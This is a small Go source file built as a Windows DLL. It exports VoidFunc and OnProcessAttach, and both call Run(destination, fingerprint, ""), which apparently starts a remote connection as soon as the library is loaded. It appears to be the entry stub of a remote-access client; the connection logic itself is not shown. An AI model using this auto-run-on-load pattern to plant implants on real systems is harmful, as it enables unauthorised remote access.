//go:build windows && cgo && cshared

package main

import "C"

//export VoidFunc
func VoidFunc() {
	Run(destination, fingerprint, "")
}

//export OnProcessAttach
func OnProcessAttach() {

	Run(destination, fingerprint, "")
}
